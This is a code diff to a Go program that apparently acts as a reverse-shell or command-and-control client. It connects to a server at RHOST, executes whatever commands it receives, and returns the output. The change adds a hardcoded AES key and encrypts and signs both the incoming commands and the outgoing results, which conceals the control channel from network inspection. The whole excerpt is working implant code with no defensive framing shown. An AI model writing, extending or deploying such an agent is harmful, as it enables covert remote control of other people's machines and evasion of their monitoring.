@@ -13,7 +13,8 @@ import (
 )
 
 const (
-	RHOST = "127.0.0.1"
+	RHOST  = "127.0.0.1"
+	AESKey = "b660d6fef7c0248988b56695667e5714"
 )
 
 func ExecuteCommand(command string) string {
@@ -75,11 +76,18 @@ func main() {
 	conn.Write([]byte("yes\n"))
 
 	for {
-		cmd, err := reader.ReadString('\n')
+		encryptedCmd, err := reader.ReadString('\n')
 		if err != nil {
 			fmt.Println("Error reading command from server:", err)
 			continue
 		}
+
+		cmd, err := DecryptAndVerify(encryptedCmd, AESKey)
+		if err != nil {
+			fmt.Println("Error decryoting command from server:", err)
+			continue
+		}
+
 		cmd = strings.TrimSpace(cmd)
 
 		if cmd == "exit" {
@@ -89,7 +97,14 @@ func main() {
 
 		result := ExecuteCommand(cmd)
 		resultEncoded := base64.StdEncoding.EncodeToString([]byte(result))
-		_, err = conn.Write([]byte(resultEncoded + "\n"))
+
+		encryptedResult, err := SignAndEncrypt(resultEncoded, AESKey)
+		if err != nil {
+			fmt.Println("Error encrypting results:", err)
+			continue
+		}
+
+		_, err = conn.Write([]byte(encryptedResult + "\n"))
 		if err != nil {
 			fmt.Println("Error sending result:", err)
 			continue
